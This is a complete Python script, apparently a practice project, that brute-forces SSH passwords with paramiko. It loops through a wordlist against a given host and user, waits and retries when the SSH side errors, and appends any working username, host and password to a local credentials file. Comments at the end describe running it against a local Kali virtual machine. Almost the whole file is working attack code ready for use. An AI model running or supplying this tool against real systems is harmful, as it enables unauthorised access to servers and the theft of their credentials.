import paramiko
import socket
import time
import argparse
from colorama import init, Fore

init() # initialize colorama

GREEN = Fore.GREEN
BLUE = Fore.BLUE
RESET = Fore.RESET
RED = Fore.RED

def is_ssh_open(hostname, username, password):
    client = paramiko.SSHClient() # Initialize Client
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Create Public Key

    try: 
        client.connect(hostname=hostname, username=username, password=password, timeout=3)

    except socket.timeout:
        print(f'{RED}[-] Host: {hostname} is unreachable. Time out {RESET}')
        return False

    except paramiko.AuthenticationException:
        print(f'[-] Invalid credentials for {username}: {password}')

    except paramiko.SSHException:
        print(f'{BLUE}[*] Retrying with delay...{RESET}')
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    
    else:
        print(f'{GREEN} Found Combo: \n\t HOSTNAME:{hostname} \n\t USERNAME:{username} \n\t PASSWORD:{password}{RESET}')

        return True


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='SSH BruteForce..')
    parser.add_argument('host', help='Hostname or IP Address of SSH server..')
    parser.add_argument('-P', '--passlist', help='Password File for brute force..')
    parser.add_argument('-u', '--user', help='Host Username..')

    args = parser.parse_args()

    host = args.host
    passlist = args.passlist
    user = args.user

    passlist = open(passlist).read().splitlines()

    for password in passlist:
        if is_ssh_open(host, user, password):
            open('credentials.txt', 'a').write(f'{user}@{host}:{password}')
            break

# Steps to Run this script:
# Create a text document 'wordlist' and Add wordlist to your folder.

# Install SSH manually in windows.
#            Or
# Open linux window in VirtualBox #

# Open terminal and run following commands:
# sudo apt update
# sudo systemctl start ssh
# sudo systemctl status ssh
# sudo nano/etc/ssh/sshd_config

# Open terminal in VScode and Run:
#  cd .\SSH_Cracker_Tool\
# python .\ssh_brute.py 10.0.2.15 -u kali -P wordlist.txt
# sudo nano/etc/ssh/sshd_config
